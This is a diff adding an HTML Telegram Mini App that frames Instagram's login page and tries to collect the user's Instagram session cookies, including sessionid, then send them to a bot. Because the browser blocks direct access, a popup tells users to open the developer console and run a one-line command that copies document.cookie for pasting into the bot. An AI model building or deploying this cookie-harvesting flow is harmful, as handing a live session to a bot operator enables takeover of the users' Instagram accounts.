@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram Login - Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        #iframe-container {
+            width: 100%;
+            height: 100vh;
+            position: relative;
+        }
+        
+        #instagram-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        .loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 1000;
+            background: var(--tg-theme-bg-color, white);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+        
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: var(--tg-theme-button-color, #0088cc);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .success {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--tg-theme-bg-color, white);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 20px;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: scaleIn 0.5s ease-out;
+        }
+        
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+        
+        .success h2 {
+            color: var(--tg-theme-text-color, #000);
+            margin-bottom: 10px;
+        }
+        
+        .success p {
+            color: var(--tg-theme-hint-color, #999);
+            text-align: center;
+            line-height: 1.5;
+        }
+        
+        .instruction {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            padding: 15px;
+            text-align: center;
+            font-size: 14px;
+            color: var(--tg-theme-hint-color, #999);
+            z-index: 100;
+            border-top: 1px solid rgba(0,0,0,0.1);
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading" class="loading">
+        <div class="spinner"></div>
+        <p>Загрузка Instagram...</p>
+    </div>
+    
+    <div id="success" class="success hidden">
+        <div class="success-icon">✅</div>
+        <h2>Успешно!</h2>
+        <p>Cookies получены и отправлены в бот.<br>Можете закрыть это окно.</p>
+    </div>
+    
+    <div id="iframe-container">
+        <iframe id="instagram-frame" src="https://www.instagram.com/accounts/login/" allow="camera; microphone; geolocation"></iframe>
+    </div>
+    
+    <div id="instruction" class="instruction">
+        Войдите в Instagram, затем нажмите кнопку "Готово" внизу
+    </div>
+
+    <script>
+        // Initialize Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+        
+        // Get user data from Telegram
+        const telegramUser = tg.initDataUnsafe?.user;
+        const chatId = telegramUser?.id;
+        
+        console.log('Telegram User:', telegramUser);
+        
+        let checkInterval;
+        let cookiesSent = false;
+        
+        // Hide loading when iframe loads
+        const iframe = document.getElementById('instagram-frame');
+        iframe.addEventListener('load', function() {
+            document.getElementById('loading').classList.add('hidden');
+        });
+        
+        // Function to get cookies from iframe (won't work due to CORS, but we'll try)
+        async function getCookiesFromIframe() {
+            try {
+                // Try to access iframe cookies (will fail due to same-origin policy)
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const cookies = iframeDoc.cookie;
+                
+                if (cookies && cookies.includes('sessionid')) {
+                    return parseCookies(cookies);
+                }
+            } catch (e) {
+                console.log('Cannot access iframe cookies due to CORS:', e);
+            }
+            return null;
+        }
+        
+        // Parse cookies string to array of objects
+        function parseCookies(cookieString) {
+            return cookieString.split(';').map(c => {
+                const [name, ...rest] = c.trim().split('=');
+                return {
+                    name: name,
+                    value: rest.join('='),
+                    domain: '.instagram.com',
+                    path: '/',
+                    expires: -1
+                };
+            }).filter(c => c.name && c.value);
+        }
+        
+        // Send cookies to bot
+        async function sendCookiesToBot(cookies) {
+            if (cookiesSent) return;
+            
+            const cookiesJson = JSON.stringify(cookies, null, 2);
+            
+            // Send data back to bot via Telegram WebApp
+            tg.sendData(JSON.stringify({
+                action: 'instagram_cookies',
+                chat_id: chatId,
+                cookies: cookies,
+                username: 'from_webapp'
+            }));
+            
+            cookiesSent = true;
+            
+            // Show success message
+            document.getElementById('success').classList.remove('hidden');
+            document.getElementById('iframe-container').classList.add('hidden');
+            document.getElementById('instruction').classList.add('hidden');
+            
+            // Close app after 2 seconds
+            setTimeout(() => {
+                tg.close();
+            }, 2000);
+        }
+        
+        // Setup Main Button
+        tg.MainButton.text = "✅ Готово - Отправить cookies";
+        tg.MainButton.show();
+        tg.MainButton.onClick(async function() {
+            tg.MainButton.showProgress();
+            
+            // Try to get cookies (won't work due to CORS in most cases)
+            let cookies = await getCookiesFromIframe();
+            
+            if (!cookies) {
+                // Fallback: ask user to paste cookies manually
+                tg.showPopup({
+                    title: 'Нужны cookies',
+                    message: 'Из-за ограничений браузера, не удалось получить cookies автоматически.\n\nОткройте консоль (F12) и выполните:\n\ncopy(JSON.stringify(document.cookie.split(";").map(c=>{const[n,...v]=c.trim().split("=");return{name:n,value:v.join("="),domain:".instagram.com",path:"/",expires:-1}})))',
+                    buttons: [
+                        {id: 'ok', type: 'ok', text: 'Понятно'}
+                    ]
+                }, function(buttonId) {
+                    tg.MainButton.hideProgress();
+                    if (buttonId === 'ok') {
+                        // User will paste cookies manually in bot
+                        tg.close();
+                    }
+                });
+                return;
+            }
+            
+            await sendCookiesToBot(cookies);
+            tg.MainButton.hideProgress();
+        });
+        
+        // Alternative: Monitor iframe URL changes (if Instagram redirects after login)
+        checkInterval = setInterval(async function() {
+            try {
+                const iframeUrl = iframe.contentWindow.location.href;
+                console.log('Current iframe URL:', iframeUrl);
+                
+                // If redirected to home page, user likely logged in
+                if (iframeUrl.includes('instagram.com') && !iframeUrl.includes('/accounts/login')) {
+                    clearInterval(checkInterval);
+                    
+                    // Try to get cookies
+                    const cookies = await getCookiesFromIframe();
+                    if (cookies && cookies.length > 0) {
+                        await sendCookiesToBot(cookies);
+                    }
+                }
+            } catch (e) {
+                // Can't access iframe URL due to CORS - this is expected
+                console.log('Cannot check iframe URL:', e);
+            }
+        }, 2000);
+        
+        // Clean up on page unload
+        window.addEventListener('beforeunload', function() {
+            if (checkInterval) {
+                clearInterval(checkInterval);
+            }
+        });
+        
+        // Handle back button
+        tg.BackButton.show();
+        tg.BackButton.onClick(function() {
+            tg.close();
+        });
+        
+        // Show alert about CORS limitation
+        setTimeout(function() {
+            if (!cookiesSent) {
+                tg.showAlert(
+                    'ℹ️ Из-за ограничений безопасности браузера, ' +
+                    'cookies нужно будет скопировать вручную через консоль (F12).\n\n' +
+                    'После входа нажмите "Готово" и следуйте инструкциям.'
+                );
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
